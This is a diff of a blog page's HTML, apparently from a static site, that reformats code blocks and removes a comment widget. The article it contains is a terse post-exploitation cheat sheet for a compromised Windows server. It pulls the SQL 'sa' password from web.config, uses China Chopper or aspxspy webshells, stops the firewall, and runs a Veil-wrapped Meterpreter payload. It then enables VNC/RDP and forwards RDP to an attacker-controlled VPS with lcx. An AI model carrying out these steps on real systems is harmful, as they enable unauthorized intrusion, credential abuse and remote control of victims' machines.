@@ -131,12 +131,11 @@
         <span itemprop="articleBody"><h3 id="1search-webconfig-to-find-sa-and-sa-password">1&gt;search web.config———&gt; to find sa and sa password</h3>
 
 <h3 id="2choppperor-aspxspyto-connect-dbget-sa-privilege">2&gt;choppper(or aspxspy)to connect db,get sa privilege</h3>
-<div class="highlighter-rouge"><pre class="highlight"><code>sometimes strong webshell (like aspxspy.aspx) cannot get system privilege with sa and pass,try:
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sometimes strong webshell (like aspxspy.aspx) cannot get system privilege with sa and pass,try:
 1.use sa execute cmd in chopper
 or
 2.restart the system and try strong webshell like aspxspy.aspx
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="3net-stop-sharedaccess">3&gt;net stop sharedaccess</h3>
 
@@ -145,21 +144,19 @@ or
 <h3 id="5use-sa-pri-run-meterpreteruse-veil-to-jail-payload">5&gt;use sa pri run meterpreter(use veil to jail) payload</h3>
 
 <h3 id="6use-meterpreter-shell-to-open-vnc-or-desktop">6&gt;use meterpreter shell to open vnc or desktop</h3>
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter&gt;run vnc
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter&gt;run vnc
 or
 meterpreter&gt;background
 msf&gt;use post/windows/manage/enable_rdp
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="7if-6-failuse-sa-privilegesin-chopperto-run">7&gt;if 6 fail,use sa privileges(in chopper)to run:</h3>
-<div class="highlighter-rouge"><pre class="highlight"><code>victim:lcx -slave vps_ip vps_port victim_ip 3389
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>victim:lcx -slave vps_ip vps_port victim_ip 3389
 vps:lcx -listen vps_port 1234
 vps:mstsc /console /v:127.0.0.1:1234  
 
 Notice:normally,mstsc----&gt;127.0.0.1:1234 is ok,sometimes exists connect num restrict,use it.in win7: need runas admin,and use:mstsc /console /v:127.0.0.1:1234 -admin
-</code></pre>
-</div>
+</code></pre></div></div>
 </span>
 
         
@@ -197,16 +194,6 @@ Notice:normally,mstsc----&gt;127.0.0.1:1234 is ok,sometimes exists connect num r
 
 
 
-      
-<!--PC和WAP自适应版-->
-<div id="SOHUCS" style="width:980px"></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = 'cyt1tnTcP'; 
-var conf = 'prod_a926ede5ea067744d582783ccd509c1f'; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
       
 
 
